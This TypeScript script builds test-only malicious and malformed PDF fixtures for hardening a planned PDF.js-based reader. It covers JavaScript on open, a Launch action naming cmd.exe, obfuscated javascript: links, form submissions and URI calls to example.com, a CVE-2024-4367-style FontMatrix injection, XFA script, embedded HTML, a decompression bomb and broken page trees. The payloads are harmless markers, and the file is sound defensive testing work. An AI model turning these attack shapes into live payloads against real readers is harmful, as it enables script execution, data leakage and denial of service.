/**
 * TEST-ONLY malicious and malformed PDFs, created BEFORE any PDF reader exists so the future
 * reader (PDF.js inside the isolated reader origin) is built against them from day one.
 *
 * Payloads are harmless markers: they try to set window.__xplor9_pdf_attack, write
 * localStorage "xplor9.pwned", or contact https://example.com (trapped by the test suite).
 * They are NOT working exploits against current software.
 *
 * Usage: node scripts/books/make-pdf-security-fixtures.ts -> test-fixtures/security/pdf/*.pdf
 *        (git-ignored; also run by the security suite's global setup)
 */
import { mkdirSync, writeFileSync } from "node:fs";
import { deflateSync, strToU8 } from "fflate";

const MARK = "try{window.top.__xplor9_pdf_attack=1;localStorage.setItem('xplor9.pwned','pdf')}catch(e){}";

type Obj = string | Uint8Array;

/** Builds a PDF from numbered objects (1..n) with a correct cross-reference table. */
export function buildPdf(objects: Obj[], opts: { root?: number; breakXref?: boolean } = {}): Uint8Array {
  const parts: Uint8Array[] = [strToU8("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")];
  let length = parts[0].byteLength;
  const offsets: number[] = [];
  objects.forEach((body, i) => {
    offsets.push(length);
    const chunk =
      typeof body === "string"
        ? strToU8(`${i + 1} 0 obj\n${body}\nendobj\n`)
        : concat([strToU8(`${i + 1} 0 obj\n`), body, strToU8("\nendobj\n")]);
    parts.push(chunk);
    length += chunk.byteLength;
  });
  const xrefAt = length;
  const rows = offsets.map((o) => `${String(opts.breakXref ? 999_999_999 - o : o).padStart(10, "0")} 00000 n \n`);
  parts.push(
    strToU8(
      `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${rows.join("")}` +
        `trailer\n<< /Size ${objects.length + 1} /Root ${opts.root ?? 1} 0 R >>\nstartxref\n${opts.breakXref ? 123456789 : xrefAt}\n%%EOF\n`,
    ),
  );
  return concat(parts);
}

/** A stream object (optionally Flate-compressed). */
function stream(data: Uint8Array, dict = "", compress = false): Uint8Array {
  const body = compress ? deflateSync(data, { level: 9 }) : data;
  const filter = compress ? " /Filter /FlateDecode" : "";
  return concat([strToU8(`<< /Length ${body.byteLength}${filter} ${dict}>>\nstream\n`), body, strToU8("\nendstream")]);
}

const text = (s: string) => stream(strToU8(`BT /F1 18 Tf 72 720 Td (${s}) Tj ET`));
const font = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>";
/** Catalog(1) -> Pages(2) -> Page(3) with content(4) and font(5); extra objects start at 6. */
const onePage = (title: string, catalogExtra = "", pageExtra = "", extra: Obj[] = []): Obj[] => [
  `<< /Type /Catalog /Pages 2 0 R ${catalogExtra}>>`,
  "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
  `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> ${pageExtra}>>`,
  text(title),
  font,
  ...extra,
];
const link = (action: string) => `<< /Type /Annot /Subtype /Link /Rect [72 600 400 640] /Border [0 0 0] /A ${action} >>`;

export interface PdfFixture {
  name: string;
  /** What a safe reader must do with this file. */
  expect: "render-inert" | "refuse";
  threat: string;
  build: () => Uint8Array;
}

export const PDF_FIXTURES: PdfFixture[] = [
  {
    name: "clean",
    expect: "render-inert",
    threat: "Baseline: a valid one-page PDF must render.",
    build: () => buildPdf(onePage("Clean test page")),
  },
  {
    name: "js-openaction",
    expect: "render-inert",
    threat: "Document JavaScript on open (OpenAction + Names/JavaScript). Must never execute.",
    build: () =>
      buildPdf(
        onePage("JS OpenAction", `/OpenAction 6 0 R /Names << /JavaScript << /Names [(x) 7 0 R] >> >> `, "", [
          `<< /S /JavaScript /JS (${MARK} this.submitForm\\('https://example.com/pdf-js'\\);) >>`,
          `<< /S /JavaScript /JS (${MARK}) >>`,
        ]),
      ),
  },
  {
    name: "launch-action",
    expect: "render-inert",
    threat: "Launch action that asks to run a program. Must be ignored.",
    build: () => buildPdf(onePage("Launch", "", "/Annots [6 0 R]", [link("<< /S /Launch /F (calc.exe) /Win << /F (cmd.exe) /P (/c echo pwned) >> >>")])),
  },
  {
    name: "javascript-uri",
    expect: "render-inert",
    threat: "Link with a javascript: URI (and tab-obfuscated variant). Must not become a clickable script.",
    build: () =>
      buildPdf(
        onePage("JS URI", "", "/Annots [6 0 R 7 0 R]", [
          link(`<< /S /URI /URI (javascript:${MARK}) >>`),
          `<< /Type /Annot /Subtype /Link /Rect [72 540 400 580] /A << /S /URI /URI (java\tscript:${MARK}) >> >>`,
        ]),
      ),
  },
  {
    name: "uri-on-open",
    expect: "render-inert",
    threat: "Opening the document triggers a web request (OpenAction URI). Must not contact the network.",
    build: () => buildPdf(onePage("URI on open", "/OpenAction << /S /URI /URI (https://example.com/pdf-open) >> ")),
  },
  {
    name: "submit-form",
    expect: "render-inert",
    threat: "AcroForm SubmitForm sends data to a server. Must not submit.",
    build: () =>
      buildPdf(
        onePage("Submit form", "/AcroForm << /Fields [6 0 R] >> ", "/Annots [6 0 R]", [
          `<< /Type /Annot /Subtype /Widget /FT /Btn /Ff 65536 /T (go) /Rect [72 600 300 640] /P 3 0 R /A << /S /SubmitForm /F << /FS /URL /F (https://example.com/pdf-submit) >> /Flags 4 >> >>`,
        ]),
      ),
  },
  {
    name: "remote-goto",
    expect: "render-inert",
    threat: "GoToR / GoToE to a remote or embedded document. Must not fetch or open it.",
    build: () => buildPdf(onePage("Remote GoTo", "", "/Annots [6 0 R]", [link("<< /S /GoToR /F (https://example.com/remote.pdf) /D [0 /Fit] /NewWindow true >>")])),
  },
  {
    name: "fontmatrix-injection",
    expect: "render-inert",
    threat:
      "CVE-2024-4367 shape: script text smuggled through a font's FontMatrix into PDF.js glyph code. " +
      "Fixed in PDF.js 4.2.67; must stay inert (also run with isEvalSupported=false).",
    build: () =>
      buildPdf([
        "<< /Type /Catalog /Pages 2 0 R >>",
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
        text("FontMatrix"),
        `<< /Type /Font /Subtype /Type1 /BaseFont /Foo /FirstChar 65 /LastChar 65 /Widths [500] /FontDescriptor 6 0 R /FontMatrix [1 0 0 1 0 (0\\); ${MARK} //)] >>`,
        "<< /Type /FontDescriptor /FontName /Foo /Flags 4 /FontBBox [0 0 1000 1000] /ItalicAngle 0 /Ascent 1000 /Descent 0 /CapHeight 1000 /StemV 80 >>",
      ]),
  },
  {
    name: "xfa-script",
    expect: "render-inert",
    threat: "XFA form containing <script>. XFA must stay disabled (enableXfa=false).",
    build: () =>
      buildPdf(
        onePage("XFA", "/AcroForm << /Fields [] /XFA 6 0 R >> ", "", [
          stream(strToU8(`<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template><subform><script contentType="application/x-javascript">${MARK}</script></subform></template></xdp:xdp>`)),
        ]),
      ),
  },
  {
    name: "embedded-html",
    expect: "render-inert",
    threat: "Embedded HTML attachment. Must not be opened or rendered automatically.",
    build: () =>
      buildPdf(
        onePage("Embedded file", "/Names << /EmbeddedFiles << /Names [(x.html) 6 0 R] >> >> ", "", [
          "<< /Type /Filespec /F (x.html) /UF (x.html) /EF << /F 7 0 R >> >>",
          stream(strToU8(`<script>${MARK}</script>`), "/Type /EmbeddedFile /Subtype /text#2Fhtml "),
        ]),
      ),
  },
  {
    name: "flate-bomb-300mb",
    expect: "refuse",
    threat: "A ~300 KB page stream that inflates to 300 MB. Must be stopped without freezing XPLOR9.",
    build: () => buildPdf(onePage("Bomb", "", "", []).map((o, i) => (i === 3 ? stream(new Uint8Array(300 * 1024 * 1024).fill(0x20), "", true) : o))),
  },
  {
    name: "huge-page-count",
    expect: "refuse",
    threat: "Page tree claims 2,000,000,000 pages. Must not allocate per claimed page or hang.",
    build: () => buildPdf(onePage("Huge count").map((o, i) => (i === 1 ? "<< /Type /Pages /Kids [3 0 R] /Count 2000000000 >>" : o))),
  },
  {
    name: "recursive-pages",
    expect: "refuse",
    threat: "Page tree that contains itself. Must fail cleanly instead of looping forever.",
    build: () => buildPdf(onePage("Recursive").map((o, i) => (i === 1 ? "<< /Type /Pages /Kids [2 0 R 3 0 R] /Count 2 >>" : o))),
  },
  {
    name: "malformed-xref",
    expect: "refuse",
    threat: "Cross-reference table points to garbage. Must fail (or recover) cleanly, with a friendly message.",
    build: () => buildPdf(onePage("Malformed xref"), { breakXref: true }),
  },
  {
    name: "truncated",
    expect: "refuse",
    threat: "File cut off half way. Must fail cleanly.",
    build: () => {
      const full = buildPdf(onePage("Truncated"));
      return full.subarray(0, Math.floor(full.byteLength / 2));
    },
  },
  {
    name: "not-a-pdf",
    expect: "refuse",
    threat: "HTML renamed to .pdf. Must be refused, never rendered as HTML.",
    build: () => strToU8(`<html><body><script>${MARK}</script>Not a PDF</body></html>`),
  },
];

function concat(parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.byteLength, 0));
  let o = 0;
  for (const p of parts) {
    out.set(p, o);
    o += p.byteLength;
  }
  return out;
}

if (process.argv[1]?.replace(/\\/g, "/").endsWith("scripts/books/make-pdf-security-fixtures.ts")) {
  const OUT = "test-fixtures/security/pdf";
  mkdirSync(OUT, { recursive: true });
  for (const f of PDF_FIXTURES) writeFileSync(`${OUT}/${f.name}.pdf`, f.build());
  writeFileSync(
    `${OUT}/manifest.json`,
    JSON.stringify(PDF_FIXTURES.map(({ name, expect, threat }) => ({ file: `${name}.pdf`, expect, threat })), null, 2),
  );
  console.log(`Wrote ${PDF_FIXTURES.length} PDF fixtures to ${OUT}`);
}
